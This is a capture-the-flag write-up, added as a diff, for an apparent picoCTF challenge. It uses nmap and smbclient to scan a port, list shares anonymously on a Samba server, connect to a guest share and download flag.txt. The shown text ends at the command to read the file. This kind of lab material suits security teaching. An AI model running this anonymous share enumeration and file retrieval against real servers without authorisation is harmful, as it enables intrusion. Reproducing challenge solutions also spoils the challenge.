@@ -1,0 +1,86 @@
+Step 1: Understanding the Challenge
+
+The challenge involves retrieving a file that was sent to a network printer. Printers often use SMB (Server Message Block) protocol for network printing, and print jobs are temporarily stored (spooled) on the print server. Our goal is to connect to this SMB service and retrieve the print job.
+Step 2: Initial Port Scan
+
+First, let's check if the port is accessible:
+bash
+
+nmap -p 58811 mysterious-sea.picoctf.net
+
+Output:
+text
+
+PORT      STATE    SERVICE
+58811/tcp filtered unknown
+
+The port shows as "filtered," but this doesn't necessarily mean we can't connect - it just means Nmap's default scan couldn't determine if it's open.
+Step 3: List Available SMB Shares
+
+Using smbclient with the -L flag to list all available shares on the server:
+bash
+
+smbclient -L //mysterious-sea.picoctf.net -p 58811 -N
+
+Output:
+text
+
+Sharename       Type      Comment
+---------       ----      -------
+shares          Disk      Public Share With Guests
+IPC$            IPC       IPC Service (Samba 4.19.5-Ubuntu)
+
+We found a share called "shares" - this is likely where files are stored.
+Step 4: Connect to the Share
+
+Connect to the "shares" share using smbclient:
+bash
+
+smbclient //mysterious-sea.picoctf.net/shares -p 58811 -N
+
+Output:
+text
+
+Try "help" to get a list of possible commands.
+smb: \>
+
+We're now connected to the share with an interactive prompt.
+Step 5: List Files in the Share
+
+Inside the smbclient prompt, list all files:
+bash
+
+smb: \> ls
+
+Output:
+text
+
+  .                                   D        0  Fri Mar  6 15:25:42 2026
+  ..                                  D        0  Fri Mar  6 15:25:42 2026
+  dummy.txt                           N     1142  Wed Feb  4 16:22:17 2026
+  flag.txt                            N       37  Fri Mar  6 15:25:42 2026
+
+We found our target: flag.txt!
+Step 6: Download the Flag File
+
+Download the file to our local machine:
+bash
+
+smb: \> get flag.txt
+
+Output:
+text
+
+getting file \flag.txt of size 37 as flag.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
+
+Step 7: Exit smbclient
+bash
+
+smb: \> exit
+
+Step 8: View the Flag
+
+Read the downloaded file:
+bash
+
+cat flag.txt
